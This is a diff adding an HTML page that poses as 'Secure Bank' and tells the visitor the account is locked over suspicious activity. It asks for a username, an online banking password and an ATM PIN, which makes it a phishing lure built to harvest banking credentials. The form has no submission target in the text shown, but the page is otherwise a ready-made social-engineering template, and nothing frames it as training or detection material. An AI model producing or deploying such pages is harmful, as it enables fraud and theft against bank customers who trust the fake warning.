@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Bank - Account Verification Required</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; border-top: 5px solid #d32f2f; }
+        h2 { color: #d32f2f; margin-bottom: 10px; }
+        p { color: #555; font-size: 14px; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #d32f2f; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+        button:hover { background: #b71c1c; }
+        .logo { font-size: 40px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🏦</div>
+        <h2>Account Locked</h2>
+        <p>We've detected suspicious activity. Please verify your identity by entering your secure banking credentials below.</p>
+        <form>
+            <input type="text" placeholder="Username or ID" required>
+            <input type="password" placeholder="Online Banking Password" required>
+            <input type="password" placeholder="ATM PIN (For extra security)" required>
+            <button type="submit">Verify My Account</button>
+        </form>
+    </div>
+</body>
+</html>
